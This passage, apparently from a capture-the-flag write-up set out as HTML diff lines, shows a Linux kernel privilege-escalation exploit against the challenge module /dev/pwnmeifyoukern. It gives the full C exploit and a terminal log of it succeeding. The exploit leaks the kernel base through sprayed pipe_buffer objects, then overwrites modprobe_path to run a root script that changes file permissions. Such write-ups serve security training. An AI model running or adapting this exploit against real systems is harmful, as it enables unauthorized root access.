+<span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x108</span>) <span style="color:#ff79c6">=</span> modprobe_path;
+edit_item(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x110</span>);
+
+<span style="color:#6272a4">// leak [modprobe_path; modprobe_path + 0x108] to prevent panic
+</span><span style="color:#6272a4"></span>memset(bak, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(bak));
+n <span style="color:#ff79c6">=</span> read(fd, bak, <span style="color:#bd93f9">0x110</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x108</span>);
+<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> n) {
+    err(<span style="color:#f1fa8c">&#34;read&#34;</span>);
+}
+<span style="color:#6272a4">//hex_view(bak, n);
+</span><span style="color:#6272a4"></span>
+<span style="color:#6272a4">// overwrite modprobe_path
+</span><span style="color:#6272a4"></span>strncpy(buf, <span style="color:#f1fa8c">&#34;/home/user/pld&#34;</span>, BUF_SIZE);
+edit_item(<span style="color:#bd93f9">1</span>, buf, strlen(buf) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>);
+
+<span style="color:#6272a4">// B.next = modprobe_path + 0x20
+</span><span style="color:#6272a4"></span>memset(buf, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+<span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x108</span>) <span style="color:#ff79c6">=</span> modprobe_path <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x20</span>;
+edit_item(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x110</span>);
+
+<span style="color:#6272a4">// prevent panic
+</span><span style="color:#6272a4"></span>memmove(bak, bak<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x110</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x20</span>, <span style="color:#bd93f9">0x108</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x20</span>);
+edit_item(<span style="color:#bd93f9">1</span>, bak, <span style="color:#bd93f9">0x108</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x20</span>);
+</code></pre></div><p>We just need to create the script <code>/home/user/pld</code> that will be executed with
+the root user and to execute a file containing an unknown magic number to
+trigger to execution of <code>/home/user/pld</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">puts(<span style="color:#f1fa8c">&#34;[+] getting a shell :)&#34;</span>);
+system(<span style="color:#f1fa8c">&#34;echo &#39;#!/bin/sh</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">chmod -R 777 /passwd&#39; &gt; /home/user/pld&#34;</span>);
+system(<span style="color:#f1fa8c">&#34;echo -e &#39;</span><span style="color:#f1fa8c">\xef\xbe\xad\xde</span><span style="color:#f1fa8c">&#39; &gt; /home/user/x&#34;</span>);
+system(<span style="color:#f1fa8c">&#34;chmod 777 /home/user/pld /home/user/x&#34;</span>);
+system(<span style="color:#f1fa8c">&#34;/home/user/x&#34;</span>);
+</code></pre></div><p>To upload the exploit binary on the remote server and minimize it we can compile
+it using <code>musl-gcc</code>, then <code>gzip</code> and <code>base64</code> it.</p>
+<hr>
+<pre tabindex="0"><code>user@PwnMeIfYouKern:~$ ls -la /passwd
+total 4
+drwxr-xr-x    2 root     0                0 May  5 21:55 .
+drwxr-xr-x   14 user     1000             0 May  9 22:46 ..
+-rw-------    1 root     0               17 May  5 21:55 passwd
+user@PwnMeIfYouKern:~$ cat /passwd/passwd
+cat: can't open '/passwd/passwd': Permission denied
+user@PwnMeIfYouKern:~$ /exploit
+[*] Spraying pipe_buffer objects...
+[+] pipe_buffer.ops = 0xffffffffa2810840
+[+] kbase = 0xffffffffa2000000
+[+] modprobe_path @ 0xffffffffa2a51a00
+[+] getting a shell :)
+/home/user/x: line 1: ﾭ: not found
+user@PwnMeIfYouKern:~$ ls -la /passwd/passwd
+-rwxrwxrwx    1 root     0               17 May  5 21:55 /passwd/passwd
+user@PwnMeIfYouKern:~$ cat /passwd/passwd
+PWNME{dummyflag}
+</code></pre><h2 id="full-exploit">Full exploit</h2>
+<p>Here is the full exploitation code :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6"></span>
+<span style="color:#ff79c6">#define err(msg) do { perror(msg); exit(-1); } while (0);
+</span><span style="color:#ff79c6"></span>
+<span style="color:#ff79c6">#define BUF_SIZE 0x1000
+</span><span style="color:#ff79c6">#define NUM_PIPEFDS 0x1
+</span><span style="color:#ff79c6"></span>
+<span style="color:#8be9fd">int</span> fd;
+
+<span style="color:#ff79c6">struct</span> arg_new {
+    <span style="color:#8be9fd">int</span> new_item;
+    <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">0</span>];
+};
+
+<span style="color:#ff79c6">struct</span> arg_edit {
+    <span style="color:#8be9fd">int</span> new_item;
+    <span style="color:#8be9fd">int</span> idx;
+    <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">0</span>];
+};
+
+<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">hex_view</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buf, size_t size) {
+    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> size; i<span style="color:#ff79c6">++</span>) {
+        <span style="color:#ff79c6">if</span> ((i <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">0x10</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
+            printf(<span style="color:#f1fa8c">&#34;%08x:&#34;</span>, i);
+        }
+        printf(<span style="color:#f1fa8c">&#34; %02hhx&#34;</span>, buf[i]);
+        <span style="color:#ff79c6">if</span> ((i <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">0x10</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0xf</span>) {
+            printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+        }
+    }
+    printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+}
+
+<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">new_item</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buf, size_t size) {
+    <span style="color:#ff79c6">struct</span> arg_new <span style="color:#ff79c6">*</span>arg <span style="color:#ff79c6">=</span> calloc(<span style="color:#bd93f9">1</span>, <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> arg_new) <span style="color:#ff79c6">+</span> size);
+    arg<span style="color:#ff79c6">-&gt;</span>new_item <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+    memcpy(arg<span style="color:#ff79c6">-&gt;</span>buf, buf, size);
+
+    <span style="color:#6272a4">//hex_view(arg, sizeof(struct arg_new) + size);
+</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> write(fd, arg, <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> arg_new) <span style="color:#ff79c6">+</span> size)) {
+        err(<span style="color:#f1fa8c">&#34;write new item&#34;</span>);
+    }
+
+    free(arg);
+}
+
+<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">edit_item</span>(<span style="color:#8be9fd">int</span> idx, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buf, size_t size) {
+    <span style="color:#ff79c6">struct</span> arg_edit <span style="color:#ff79c6">*</span>arg <span style="color:#ff79c6">=</span> calloc(<span style="color:#bd93f9">1</span>, <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> arg_edit) <span style="color:#ff79c6">+</span> size);
+    arg<span style="color:#ff79c6">-&gt;</span>new_item <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+    arg<span style="color:#ff79c6">-&gt;</span>idx <span style="color:#ff79c6">=</span> idx;
+    memcpy(arg<span style="color:#ff79c6">-&gt;</span>buf, buf, size);
+
+    <span style="color:#6272a4">//hex_view(arg, sizeof(struct arg_edit) + size);
+</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> write(fd, arg, <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> arg_edit) <span style="color:#ff79c6">+</span> size)) {
+        err(<span style="color:#f1fa8c">&#34;write edit item&#34;</span>);
+    }
+
+    free(arg);
+}
+
+
+
+<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+    <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buf <span style="color:#ff79c6">=</span> malloc(BUF_SIZE);
+    <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>leak, <span style="color:#ff79c6">*</span>kbase, <span style="color:#ff79c6">*</span>modprobe_path;
+    <span style="color:#8be9fd">int</span> n;
+    <span style="color:#8be9fd">char</span> bak[<span style="color:#bd93f9">0x400</span>] <span style="color:#ff79c6">=</span> {<span style="color:#bd93f9">0</span>};
+    <span style="color:#8be9fd">int</span> pipefd[NUM_PIPEFDS][<span style="color:#bd93f9">2</span>];
+
+    fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/dev/pwnmeifyoukern&#34;</span>, O_RDWR);
+    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> fd) {
+        err(<span style="color:#f1fa8c">&#34;open&#34;</span>);
+    }
+
+    memset(buf, <span style="color:#f1fa8c">&#39;A&#39;</span>, BUF_SIZE);
+    new_item(buf, <span style="color:#bd93f9">0x100</span>); <span style="color:#6272a4">// A
+</span><span style="color:#6272a4"></span>
+    <span style="color:#6272a4">// change A.size
+</span><span style="color:#6272a4"></span>    memset(buf, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+    memset(buf, <span style="color:#f1fa8c">&#39;A&#39;</span>, <span style="color:#bd93f9">0x100</span>);
+    <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x100</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1337</span>; <span style="color:#6272a4">// size (will be overwritten)
+</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x108</span>) <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;  <span style="color:#6272a4">// next
+</span><span style="color:#6272a4"></span>    edit_item(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x400</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x30</span>); <span style="color:#6272a4">// new size
+</span><span style="color:#6272a4"></span>
+
+    <span style="color:#6272a4">// spray with pipe_buffer
+</span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/exploit.c
+</span><span style="color:#6272a4"></span>    printf(<span style="color:#f1fa8c">&#34;[*] Spraying pipe_buffer objects...</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> NUM_PIPEFDS; i<span style="color:#ff79c6">++</span>) {
+        <span style="color:#ff79c6">if</span> (pipe(pipefd[i]) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+            err(<span style="color:#f1fa8c">&#34;pipe&#34;</span>);
+        }
+        <span style="color:#6272a4">// Write something to populate pipe_buffer.
+</span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (write(pipefd[i][<span style="color:#bd93f9">1</span>], <span style="color:#f1fa8c">&#34;pwn&#34;</span>, <span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+            err(<span style="color:#f1fa8c">&#34;pipe write&#34;</span>);
+        }
+    }
+
+
+    <span style="color:#6272a4">// read A and leak pipe_buffer.ops
+</span><span style="color:#6272a4"></span>    memset(buf, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+    n <span style="color:#ff79c6">=</span> read(fd, buf, <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x30</span>);
+    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> n) {
+        err(<span style="color:#f1fa8c">&#34;read&#34;</span>);
+    }
+    <span style="color:#6272a4">//hex_view(buf, n);
+</span><span style="color:#6272a4"></span>
+    leak <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x10</span>);
+    kbase <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">-</span> (<span style="color:#bd93f9">0xffffffffa8210840</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0xffffffffa7a00000</span>);
+    modprobe_path <span style="color:#ff79c6">=</span> kbase <span style="color:#ff79c6">+</span> (<span style="color:#bd93f9">0xffffffff89251a00</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0xffffffff88800000</span>);
+
+    printf(<span style="color:#f1fa8c">&#34;[+] pipe_buffer.ops = %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, leak);
+    printf(<span style="color:#f1fa8c">&#34;[+] kbase = %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, kbase);
+    printf(<span style="color:#f1fa8c">&#34;[+] modprobe_path @ %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, modprobe_path);
+
+
+    memset(buf, <span style="color:#f1fa8c">&#39;A&#39;</span>, BUF_SIZE);
+    new_item(buf, <span style="color:#bd93f9">0x100</span>); <span style="color:#6272a4">// B -&gt; A
+</span><span style="color:#6272a4"></span>
+
+    <span style="color:#6272a4">// B.next = modprobe_path
+</span><span style="color:#6272a4"></span>    memset(buf, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+    <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x108</span>) <span style="color:#ff79c6">=</span> modprobe_path;
+    edit_item(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x110</span>);
+
+    <span style="color:#6272a4">// leak [modprobe_path; modprobe_path + 0x108] to prevent panic
+</span><span style="color:#6272a4"></span>    memset(bak, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(bak));
+    n <span style="color:#ff79c6">=</span> read(fd, bak, <span style="color:#bd93f9">0x110</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x108</span>);
+    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> n) {
+        err(<span style="color:#f1fa8c">&#34;read&#34;</span>);
+    }
+    <span style="color:#6272a4">//hex_view(bak, n);
+</span><span style="color:#6272a4"></span>
+    <span style="color:#6272a4">// overwrite modprobe_path
+</span><span style="color:#6272a4"></span>    strncpy(buf, <span style="color:#f1fa8c">&#34;/home/user/pld&#34;</span>, BUF_SIZE);
+    edit_item(<span style="color:#bd93f9">1</span>, buf, strlen(buf) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>);
+
+    <span style="color:#6272a4">// B.next = modprobe_path + 0x20
+</span><span style="color:#6272a4"></span>    memset(buf, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+    <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x108</span>) <span style="color:#ff79c6">=</span> modprobe_path <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x20</span>;
+    edit_item(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x110</span>);
+
+    <span style="color:#6272a4">// prevent panic
+</span><span style="color:#6272a4"></span>    memmove(bak, bak<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x110</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x20</span>, <span style="color:#bd93f9">0x108</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x20</span>);
+    edit_item(<span style="color:#bd93f9">1</span>, bak, <span style="color:#bd93f9">0x108</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x20</span>);
+
+
+    puts(<span style="color:#f1fa8c">&#34;[+] getting a shell :)&#34;</span>);
+    system(<span style="color:#f1fa8c">&#34;echo &#39;#!/bin/sh</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">chmod -R 777 /passwd&#39; &gt; /home/user/pld&#34;</span>);
+    system(<span style="color:#f1fa8c">&#34;echo -e &#39;</span><span style="color:#f1fa8c">\xef\xbe\xad\xde</span><span style="color:#f1fa8c">&#39; &gt; /home/user/x&#34;</span>);
+    system(<span style="color:#f1fa8c">&#34;chmod 777 /home/user/pld /home/user/x&#34;</span>);
+    system(<span style="color:#f1fa8c">&#34;/home/user/x&#34;</span>);
+
+    close(fd);
+
+    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+}
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
